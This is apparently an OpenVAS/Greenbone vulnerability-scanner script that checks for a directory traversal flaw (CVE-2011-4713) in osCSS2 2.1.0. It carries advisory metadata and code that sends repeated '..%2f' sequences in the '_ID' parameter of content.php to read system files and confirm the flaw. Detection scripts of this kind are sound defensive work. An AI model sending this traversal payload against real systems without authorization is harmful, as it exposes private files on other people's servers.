if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902763" );
	script_version( "2021-09-14T09:46:07+0000" );
	script_cve_id( "CVE-2011-4713" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-09-14 09:46:07 +0000 (Tue, 14 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-12-12 03:17:35 +0530 (Mon, 12 Dec 2011)" );
	script_name( "osCSS2 '_ID' parameter Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_oscss_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "oscss/detected" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/46741" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18099/" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/520421" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2011/Nov/117" );
	script_xref( name: "URL", value: "http://www.rul3z.de/advisories/SSCHADV2011-034.txt" );
	script_tag( name: "impact", value: "Successful exploitation could allow attackers to perform
  directory traversal attacks and read arbitrary files on the affected application." );
	script_tag( name: "affected", value: "osCSS2 version 2.1.0." );
	script_tag( name: "insight", value: "The flaw is due to input validation error in 'id' parameter to
  'shopping_cart.php' and 'content.php', which allows attackers to read arbitrary files via
  ../(dot dot) sequences." );
	script_tag( name: "solution", value: "Update to osCSS2 SVN branch 2.1.0 stable version or later." );
	script_tag( name: "summary", value: "osCSS2 is prone to a directory traversal vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("version_func.inc.sc");
port = http_get_port( default: 80 );
if(!dir = get_dir_from_kb( port: port, app: "osCSS" )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/content.php?_ID=" + crap( data: "..%2f", length: 3 * 15 ) + files[file];
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

